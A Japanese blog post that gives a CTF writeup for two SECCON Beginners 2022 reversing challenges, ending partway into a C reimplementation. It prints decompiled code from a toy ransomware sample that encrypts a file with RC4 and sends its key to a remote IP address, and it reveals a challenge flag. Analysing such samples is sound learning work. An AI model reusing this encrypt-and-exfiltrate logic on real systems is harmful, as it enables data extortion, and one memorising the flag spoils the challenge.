<!DOCTYPE html>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="毎日眠いです。">
    
    
    <link rel="shortcut icon" href="https://hanazonochateau.net/favicon.ico">
    
    
    <link rel="stylesheet" href="https://hanazonochateau.net/css/style.min.css">

    <title>SECCON Beginners CTF 2022 参加記 &amp; Writeup</title>

    <meta property="og:title" content="SECCON Beginners CTF 2022 参加記 &amp; Writeup" />
<meta property="og:description" content="ctf4bに参加しました 6月の4,5日に開催されたSECCON Beginners CTF 2022にチーム DCDC の一員として参加しました。 その中でrevのWinTLSとRansomを解きました。
まずは感想 初めてのCTFでしたが、解きごたえがあり大変楽しくプレイできたと思います。
実際に満足する程解けたかというと、チームメンバーが怒涛の勢いで解いてて、それについていくので精一杯でした。 revやpwnのhard問題まで解けるように精進したいです。
Writeup 自分が解いたrevのWinTLSとRansomの解説をしたいと思います。
WinTLS PEバイナリが与えられます。 Windowsで実行すると、テキストボックスとボタンがあるウィンドウが表示され、フラグを入力してボタンを押すと正しいか間違っているか教えてくれます。
とりあえずGhidraに食わせてみると main 関数内に WndProc があったのでそれをクリック。
WndProc に設定されているプログラムはこんな感じ。
LRESULT UndefinedFunction_004018f9(HWND param_1,uint param_2,WPARAM param_3,longlong param_4) { (省略) pvStack16 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&amp;t1,atStack312,0, &amp;DStack36); pvStack24 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&amp;t2,atStack312,0, &amp;DStack36); WaitForSingleObject(pvStack16,0xffffffff); WaitForSingleObject(pvStack24,0xffffffff); GetExitCodeThread(pvStack16,&amp;DStack40); GetExitCodeThread(pvStack16,&amp;DStack44); CloseHandle(pvStack16); CloseHandle(pvStack24); if ((DStack40 == 0) &amp;&amp; (DStack44 == 0)) { MessageBoxA((HWND)0x0,&#34;Correct flag!&#34;,&#34;DOPE&#34;,0x40); } else { MessageBoxA((HWND)0x0,&#34;Wrong flag...&#34;,&#34;NOPE&#34;,0x10); } return 0; (省略) } CreateThread で t1 と t2 というスレッドを作り、ExitCodeが両方とも0だったら正しいフラグのようです。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://hanazonochateau.net/posts/2022/06/06/ctf4b2022/" /><meta property="og:image" content="https://hanazonochateau.net/site_ogp.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-06-06T20:17:45+09:00" />
<meta property="article:modified_time" content="2022-06-06T20:17:45+09:00" />


    <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://hanazonochateau.net/site_ogp.png"/>

<meta name="twitter:title" content="SECCON Beginners CTF 2022 参加記 &amp; Writeup"/>
<meta name="twitter:description" content="ctf4bに参加しました 6月の4,5日に開催されたSECCON Beginners CTF 2022にチーム DCDC の一員として参加しました。 その中でrevのWinTLSとRansomを解きました。
まずは感想 初めてのCTFでしたが、解きごたえがあり大変楽しくプレイできたと思います。
実際に満足する程解けたかというと、チームメンバーが怒涛の勢いで解いてて、それについていくので精一杯でした。 revやpwnのhard問題まで解けるように精進したいです。
Writeup 自分が解いたrevのWinTLSとRansomの解説をしたいと思います。
WinTLS PEバイナリが与えられます。 Windowsで実行すると、テキストボックスとボタンがあるウィンドウが表示され、フラグを入力してボタンを押すと正しいか間違っているか教えてくれます。
とりあえずGhidraに食わせてみると main 関数内に WndProc があったのでそれをクリック。
WndProc に設定されているプログラムはこんな感じ。
LRESULT UndefinedFunction_004018f9(HWND param_1,uint param_2,WPARAM param_3,longlong param_4) { (省略) pvStack16 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&amp;t1,atStack312,0, &amp;DStack36); pvStack24 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&amp;t2,atStack312,0, &amp;DStack36); WaitForSingleObject(pvStack16,0xffffffff); WaitForSingleObject(pvStack24,0xffffffff); GetExitCodeThread(pvStack16,&amp;DStack40); GetExitCodeThread(pvStack16,&amp;DStack44); CloseHandle(pvStack16); CloseHandle(pvStack24); if ((DStack40 == 0) &amp;&amp; (DStack44 == 0)) { MessageBoxA((HWND)0x0,&#34;Correct flag!&#34;,&#34;DOPE&#34;,0x40); } else { MessageBoxA((HWND)0x0,&#34;Wrong flag...&#34;,&#34;NOPE&#34;,0x10); } return 0; (省略) } CreateThread で t1 と t2 というスレッドを作り、ExitCodeが両方とも0だったら正しいフラグのようです。"/>

</head><body><header id="banner">
    <h2><a href="https://hanazonochateau.net/">花園シャトー107号室</a></h2>
    <nav>
        <ul>
            <li>
                <a href="https://hanazonochateau.net/posts" title="posts">posts</a>
            </li><li>
                <a href="https://hanazonochateau.net/575" title="575">575</a>
            </li><li>
                <a href="https://hanazonochateau.net/about" title="about">about</a>
            </li><li>
                <a href="https://hanazonochateau.net/comments" title="comments">comments</a>
            </li>
        </ul>
    </nav>
</header>
<main id="content">
<article>
    <header id="post-header">
        <h1>SECCON Beginners CTF 2022 参加記 &amp; Writeup</h1>
            <div>
                <time>June 6, 2022</time>
                </div>
    </header><h1 id="ctf4bに参加しました">ctf4bに参加しました</h1>
<p>6月の4,5日に開催されたSECCON Beginners CTF 2022にチーム <a href="https://dcdcnation.com/"  target="_blank" >DCDC</a> の一員として参加しました。
その中でrevのWinTLSとRansomを解きました。</p>
<h2 id="まずは感想">まずは感想</h2>
<p>初めてのCTFでしたが、解きごたえがあり大変楽しくプレイできたと思います。</p>
<p>実際に満足する程解けたかというと、チームメンバーが怒涛の勢いで解いてて、それについていくので精一杯でした。
revやpwnのhard問題まで解けるように精進したいです。</p>
<h2 id="writeup">Writeup</h2>
<p>自分が解いたrevのWinTLSとRansomの解説をしたいと思います。</p>
<h3 id="wintls">WinTLS</h3>
<p>PEバイナリが与えられます。
Windowsで実行すると、テキストボックスとボタンがあるウィンドウが表示され、フラグを入力してボタンを押すと正しいか間違っているか教えてくれます。</p>
<p>とりあえずGhidraに食わせてみると <code>main</code> 関数内に <code>WndProc</code> があったのでそれをクリック。</p>
<p><code>WndProc</code> に設定されているプログラムはこんな感じ。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">LRESULT</span> <span class="nf">UndefinedFunction_004018f9</span><span class="p">(</span><span class="n">HWND</span> <span class="n">param_1</span><span class="p">,</span><span class="n">uint</span> <span class="n">param_2</span><span class="p">,</span><span class="n">WPARAM</span> <span class="n">param_3</span><span class="p">,</span><span class="n">longlong</span> <span class="n">param_4</span><span class="p">)</span>
<span class="p">{</span>

    <span class="p">(</span><span class="err">省略</span><span class="p">)</span>

    <span class="n">pvStack16</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">((</span><span class="n">LPSECURITY_ATTRIBUTES</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">0</span><span class="p">,(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">t1</span><span class="p">,</span><span class="n">atStack312</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
                             <span class="o">&amp;</span><span class="n">DStack36</span><span class="p">);</span>
    <span class="n">pvStack24</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">((</span><span class="n">LPSECURITY_ATTRIBUTES</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">0</span><span class="p">,(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">t2</span><span class="p">,</span><span class="n">atStack312</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
                             <span class="o">&amp;</span><span class="n">DStack36</span><span class="p">);</span>
    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pvStack16</span><span class="p">,</span><span class="mh">0xffffffff</span><span class="p">);</span>
    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pvStack24</span><span class="p">,</span><span class="mh">0xffffffff</span><span class="p">);</span>
    <span class="n">GetExitCodeThread</span><span class="p">(</span><span class="n">pvStack16</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DStack40</span><span class="p">);</span>
    <span class="n">GetExitCodeThread</span><span class="p">(</span><span class="n">pvStack16</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DStack44</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pvStack16</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pvStack24</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">DStack40</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">DStack44</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">MessageBoxA</span><span class="p">((</span><span class="n">HWND</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="s">&#34;Correct flag!&#34;</span><span class="p">,</span><span class="s">&#34;DOPE&#34;</span><span class="p">,</span><span class="mh">0x40</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">MessageBoxA</span><span class="p">((</span><span class="n">HWND</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="s">&#34;Wrong flag...&#34;</span><span class="p">,</span><span class="s">&#34;NOPE&#34;</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

  <span class="p">(</span><span class="err">省略</span><span class="p">)</span>

<span class="p">}</span>
</code></pre></div><p><code>CreateThread</code> で <code>t1</code> と <code>t2</code> というスレッドを作り、ExitCodeが両方とも0だったら正しいフラグのようです。</p>
<p><code>t1</code> を見てみます。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">UndefinedFunction_0040159d</span><span class="p">(</span><span class="n">longlong</span> <span class="n">param_1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">(</span><span class="err">省略</span><span class="p">)</span>
  <span class="n">TlsSetValue</span><span class="p">(</span><span class="n">TLS</span><span class="p">,</span><span class="s">&#34;c4{fAPu8#FHh2+0cyo8$SWJH3a8X&#34;</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">uStack16</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="p">(</span><span class="n">uStack16</span> <span class="o">&lt;</span> <span class="mh">0x100</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">cStack17</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">uStack16</span><span class="p">),</span> <span class="n">cStack17</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">));</span>
      <span class="n">uStack16</span> <span class="o">=</span> <span class="n">uStack16</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(((</span><span class="kt">int</span><span class="p">)</span><span class="n">uStack16</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">uStack16</span> <span class="o">%</span> <span class="mi">5</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// 3 or 5で割り切れるとき
</span><span class="c1"></span>      <span class="n">lVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">longlong</span><span class="p">)</span><span class="n">iStack12</span><span class="p">;</span>
      <span class="n">iStack12</span> <span class="o">=</span> <span class="n">iStack12</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="n">longlong</span><span class="p">)</span><span class="o">&amp;</span><span class="n">uStack280</span> <span class="o">+</span> <span class="n">lVar1</span><span class="p">)</span> <span class="o">=</span> <span class="n">cStack17</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="o">*</span><span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)((</span><span class="n">longlong</span><span class="p">)</span><span class="o">&amp;</span><span class="n">uStack280</span> <span class="o">+</span> <span class="p">(</span><span class="n">longlong</span><span class="p">)</span><span class="n">iStack12</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">check</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">uStack280</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p><code>t2</code> も見てみます。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">UndefinedFunction_004017d1</span><span class="p">(</span><span class="n">longlong</span> <span class="n">param_1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">(</span><span class="err">省略</span><span class="p">)</span>
  <span class="n">TlsSetValue</span><span class="p">(</span><span class="n">TLS</span><span class="p">,</span><span class="s">&#34;tfb%s$T9NvFyroLh@89a9yoC3rPy&amp;3b}&#34;</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">uStack16</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="p">(</span><span class="n">uStack16</span> <span class="o">&lt;</span> <span class="mh">0x100</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">cStack17</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">uStack16</span><span class="p">),</span> <span class="n">cStack17</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">));</span>
      <span class="n">uStack16</span> <span class="o">=</span> <span class="n">uStack16</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(((</span><span class="kt">int</span><span class="p">)</span><span class="n">uStack16</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">uStack16</span> <span class="o">%</span> <span class="mi">5</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// 3で割り切れない and 5で割り切れない
</span><span class="c1"></span>      <span class="n">lVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">longlong</span><span class="p">)</span><span class="n">iStack12</span><span class="p">;</span>
      <span class="n">iStack12</span> <span class="o">=</span> <span class="n">iStack12</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
      <span class="n">acStack280</span><span class="p">[</span><span class="n">lVar1</span><span class="p">]</span> <span class="o">=</span> <span class="n">cStack17</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">acStack280</span><span class="p">[</span><span class="n">iStack12</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
  <span class="n">check</span><span class="p">(</span><span class="n">acStack280</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p><code>t1</code> ではインデックスが3か5で割り切れるときに <code>uStack280</code> にデータを格納、<code>t2</code> ではインデックスが3でも5でも割り切れないときに <code>acStack280</code> にデータを格納しています。
そしてどちらとも関数上部で <code>TlsSetValue</code> に怪しい文字列をセットしています。</p>
<p>なんとなくこのTLSにセットしている文字列を並び変えればいいのだなと思い、メモ帳開いてせっせと並び変えました。</p>
<pre tabindex="0"><code>*     *   * *     *  *     *        *        *     *  *        *  *     *        *        *     *  *        *  *     *        *        *     *  *        *  *     * 
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60
c     4   { f     A  P     u        8        #     F  H        h  2     +        0        c     y  o        8  $     S        W        J     H  3        a  8     X
  t f   b     % s       $     T  9     N  v     F        y  r        o     L  h     @  8     9        a  9        y     o  C     3  r     P        y  &amp;        3     b  }

ctf4b{f%sAP$uT98Nv#FFHyrh2o+Lh0@8c9yoa98$ySoCW3rJPH3y&amp;a83Xb}
</code></pre><p>ナルホディウス。</p>
<p>これをテキストボックスに入れてみるとOKっぽい。
ということでこれがフラグです。</p>
<h3 id="ransom">Ransom</h3>
<p>この問題の暗号化方式はRC4ってやつらしいですね、前にも見たことがあったので見抜けなかったのは痛い。
バイナリと暗号化されたテキストファイル、pcapファイルが渡され、テキストファイルを復号化するとフラグが手に入ります。</p>
<p>Ghidraくんに食わせて見やすいように変数名とか書き換えたのがこちら。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="p">(</span><span class="err">省略</span><span class="p">)</span>
  <span class="n">random_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x11</span><span class="p">);</span>
  <span class="n">random_init</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="n">random_buf</span><span class="p">);</span>
  <span class="n">originfs</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;ctf4b_super_secret.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">originfs</span> <span class="o">==</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Can</span><span class="se">\&#39;</span><span class="s">t open file.&#34;</span><span class="p">);</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">pcVar3</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">flag_contents</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">originfs</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pcVar3</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">flag_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">flag_contents</span><span class="p">);</span>
      <span class="n">crypted_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">flag_len</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
      <span class="n">lock_file</span><span class="p">(</span><span class="n">random_buf</span><span class="p">,</span><span class="n">flag_contents</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">crypted_buf</span><span class="p">);</span>
      <span class="n">lockf</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;ctf4b_super_secret.txt.lock&#34;</span><span class="p">,</span><span class="s">&#34;w&#34;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">lockf</span> <span class="o">==</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Can</span><span class="se">\&#39;</span><span class="s">t write file.&#34;</span><span class="p">);</span>
        <span class="n">iVar1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="k">goto</span> <span class="n">LAB_0010191f</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
        <span class="n">flag_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">flag_contents</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="n">flag_len</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">lockf</span><span class="p">,</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">x%02x&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">byte</span><span class="p">)</span><span class="n">crypted_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">fclose</span><span class="p">(</span><span class="n">lockf</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">originfs</span><span class="p">);</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">perror</span><span class="p">(</span><span class="s">&#34;Failed to create socket&#34;</span><span class="p">);</span>
      <span class="n">iVar1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">local_128</span><span class="p">.</span><span class="n">_0_2_</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
      <span class="n">local_124</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">&#34;192.168.0.225&#34;</span><span class="p">);</span>
      <span class="n">local_128</span><span class="p">.</span><span class="n">_2_2_</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mh">0x1f90</span><span class="p">);</span>
      <span class="n">iVar2</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">iVar1</span><span class="p">,(</span><span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="n">local_128</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">write</span><span class="p">(</span><span class="n">iVar1</span><span class="p">,</span><span class="n">random_buf</span><span class="p">,</span><span class="mh">0x11</span><span class="p">);</span>
        <span class="n">iVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;Failed to connect&#34;</span><span class="p">);</span>
        <span class="n">iVar1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="p">(</span><span class="err">省略</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">iVar1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>フラグが書かれたデータをファイルに読み込み、暗号化し、 <code>.lock</code> ファイルに書き込んでいます。
後半部では、乱数で生成した鍵を外部に送信していますね。</p>
<p>pcapファイルを覗くと鍵が手に入ったので、これを使って何とかします。</p>
<p><code>lock_file</code> 関数の中身はこうなっています。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">lock_file</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">random_buf</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">flag_contents</span><span class="p">,</span><span class="kt">long</span> <span class="n">crypted_buf</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">local_118</span> <span class="p">[</span><span class="mi">264</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">random_set</span><span class="p">(</span><span class="n">random_buf</span><span class="p">,</span><span class="n">local_118</span><span class="p">);</span>
  <span class="n">encrypt</span><span class="p">(</span><span class="n">local_118</span><span class="p">,</span><span class="n">flag_contents</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">crypted_buf</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">__stack_chk_fail</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p><code>local_118</code> に乱数で生成した鍵をセットし、それを用いて <code>encrypt</code> 関数でファイルを暗号化します。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">encrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">local_118</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">flag_contents</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">crypted_buf</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">size_t</span> <span class="n">flag_len</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">local_24</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">local_20</span><span class="p">;</span>
  <span class="n">ulong</span> <span class="n">i</span><span class="p">;</span>
  
  <span class="n">local_24</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">local_20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">flag_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">flag_contents</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">flag_len</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">local_24</span> <span class="o">=</span> <span class="n">local_24</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
    <span class="n">local_20</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="n">local_118</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_24</span><span class="p">]</span> <span class="o">+</span> <span class="n">local_20</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
    <span class="n">swap</span><span class="p">(</span><span class="n">local_118</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_24</span><span class="p">,</span><span class="n">local_118</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_20</span><span class="p">);</span>
    <span class="n">crypted_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span>
         <span class="n">flag_contents</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">local_118</span><span class="p">[(</span><span class="n">byte</span><span class="p">)(</span><span class="n">local_118</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_20</span><span class="p">]</span> <span class="o">+</span> <span class="n">local_118</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_24</span><span class="p">])];</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p><code>encrypt</code> では色々複雑なことをしていますが、最後がXORを取っているだけなので、もう一回XORしなおせば元の内容が復元できます。
自分はRC4だと知らなかったので、C言語で再実装して実験をしました。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
